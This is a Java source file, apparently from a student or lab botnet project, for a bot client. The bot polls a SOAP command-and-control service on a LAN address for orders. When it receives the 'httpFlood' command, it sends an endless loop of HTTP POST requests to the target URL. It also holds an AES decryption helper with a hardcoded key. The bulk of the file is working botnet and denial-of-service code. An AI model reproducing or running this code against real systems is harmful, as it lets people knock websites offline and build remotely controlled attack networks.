import java.io.DataOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.ShortBufferException;
import javax.crypto.spec.SecretKeySpec;

import org.apache.axiom.om.OMAbstractFactory;
import org.apache.axiom.om.OMElement;
import org.apache.axiom.om.OMFactory;
import org.apache.axiom.om.OMNamespace;
import org.apache.axis2.AxisFault;
import org.apache.axis2.addressing.EndpointReference;
import org.apache.axis2.client.Options;
import org.apache.axis2.client.ServiceClient;
import org.apache.axis2.context.ConfigurationContext;
import org.apache.axis2.context.ConfigurationContextFactory;
import org.apache.axis2.transport.http.HTTPConstants;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.MultiThreadedHttpConnectionManager;
import org.apache.commons.httpclient.params.HttpConnectionManagerParams;

public class Bot {
	
	
	private static OMFactory omFactory = OMAbstractFactory.getOMFactory();
	private static OMNamespace omNameSpace = omFactory.createOMNamespace("http://ws.apache.org/axis2", "nsTablon");
	private static Options options = new Options();
	private static String urlTablon = "http://192.168.0.13:7090/axis2/services/Tablon/";
	
	public static void main (String[] args){
		boolean actuar = false;
		Comando comando = null;
		while(!actuar){
			try{
				Thread.sleep(1000);
			} catch(InterruptedException e){
				e.printStackTrace();
			}
			comando = getComando();
			if(comando != null && !comando.getAtaque().equals("")){
				actuar = true;
				System.out.println(comando);
			}
		}
		System.out.println("---> " + comando.getAtaque());
		atacar(comando);
		
	}
	
	public static Comando getComando(){
		Comando comando = null;

		ServiceClient cliente = null;
		try {
			cliente = new ServiceClient();
		} catch (AxisFault e) {
			e.printStackTrace();
		}
		
		options.setTo(new EndpointReference(urlTablon));
		options.setAction("urn:obey");
		options.activate(getConf());

		cliente.setOptions(options);
		
		OMElement metodo = omFactory.createOMElement("getComando", omNameSpace);
		OMElement respuesta = null;
		try {
			respuesta = cliente.sendReceive(metodo);
		} catch (AxisFault e) {
			System.out.println("ups...");
			e.printStackTrace();
		}
		
		OMElement elem = respuesta.getFirstElement();
		System.out.println(elem.getText());
		try {
			comando = new Comando(elem.getText());
		} catch (NumberFormatException | MalformedURLException | ArrayIndexOutOfBoundsException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return new Comando("", null, 0);
		}
		
		return comando;
	}
	
	
	private static void atacar(Comando comando) {
		switch(comando.getAtaque()){
		case "httpFlood":
			httpFlood(comando);
			break;
		default:
			break;
		}
		return;
	}
	
	private static void httpFlood(Comando comando) {
		URL url = comando.getObjetivo();
		HttpURLConnection connection = null;
		boolean seguir = true;
		while (true) {
			System.out.println("ENVIAR PETICION HTTP");
			try {
				String urlParameters = "param1=" + URLEncoder.encode("???", "UTF-8") + "&param2="
						+ URLEncoder.encode("???", "UTF-8");
				connection = (HttpURLConnection) url.openConnection();
				connection.setRequestMethod("POST");
				connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
				connection.setRequestProperty("Content-Length", Integer.toString(urlParameters.getBytes().length));
				connection.setRequestProperty("Content-Language", "en-US");
				connection.setUseCaches(false);
				connection.setDoOutput(true);
				DataOutputStream out = new DataOutputStream(connection.getOutputStream());
				out.writeBytes(urlParameters);
				out.close();

			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
	
	
	public static void desencriptar(String cText, int cLen){
		Cipher cipher = null;
		byte[] plainText = new byte[cLen];
		SecretKeySpec sKey = null;
		byte[] pkey;
		try {
			pkey = "keykeykekeykeykekeykeykekeykeyke".getBytes("UTF-8");
		
		sKey = new SecretKeySpec(pkey, "AES");
		cipher = Cipher.getInstance("AES/ECB/NoPadding");
		cipher.init(Cipher.DECRYPT_MODE, sKey);
		byte[] encoded = cText.getBytes("ISO-8859-1");
		int plen = cipher.update(encoded, 0, cLen, plainText, 0);
		plen += cipher.doFinal(plainText, plen);
		System.out.println(" obtenida --> " + new String(plainText));
		
		
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalBlockSizeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ShortBufferException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (BadPaddingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvalidKeyException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	
	private static ConfigurationContext getConf() {

		ConfigurationContext configurationContext = null;
		try {
			configurationContext = ConfigurationContextFactory.createConfigurationContextFromFileSystem(null, null);
		} catch (AxisFault e) {
			e.printStackTrace();
		}

		MultiThreadedHttpConnectionManager multiThreadedHttpConnectionManager = new MultiThreadedHttpConnectionManager();

		HttpConnectionManagerParams params = new HttpConnectionManagerParams();

		// establecer máximo de conexiones en la pool
		params.setDefaultMaxConnectionsPerHost(20);
		multiThreadedHttpConnectionManager.setParams(params);
		HttpClient httpClient = new HttpClient(multiThreadedHttpConnectionManager);
		configurationContext.setProperty(HTTPConstants.CACHED_HTTP_CLIENT, httpClient);
		return configurationContext;
	}

	
}